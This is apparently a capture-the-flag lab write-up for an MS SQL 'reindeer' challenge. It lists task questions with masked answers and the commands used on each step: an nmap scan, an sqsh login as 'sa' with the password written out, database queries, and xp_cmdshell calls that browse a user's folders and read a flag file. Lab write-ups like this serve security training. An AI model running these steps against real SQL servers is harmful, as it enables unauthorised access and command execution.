# Day 11 - Where Are The Reindeers?

- There is an open port related to MS SQL Server accessible over the network. What is the port number?

	- `nmap -Pn <TARGET_IP>`
	- `****`

- If the connection is successful, you will get a prompt. What is the prompt that you have received?

	- `sqsh -S <TARGET_IP> -U sa -P t7uLKzddQzVjVFJp`
	- `**`

- We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?

	- `*******`

- Check the table schedule. What is the destination of the trip scheduled on December 7?

	- `select * from reindeer.dbo.schedule;`
	- `******`

- Check the table presents. What is the quantity available for the present “Power Bank”?

	- `select * from reindeer.dbo.presents;`
	- `*****`

- There is a flag hidden in the grinch user's home directory. What are its contents?

	- `xp_cmdshell 'dir C:\Users\grinch';`
	- `xp_cmdshell 'dir C:\Users\grinch\Documents';`
	- `xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';`
	- `***************`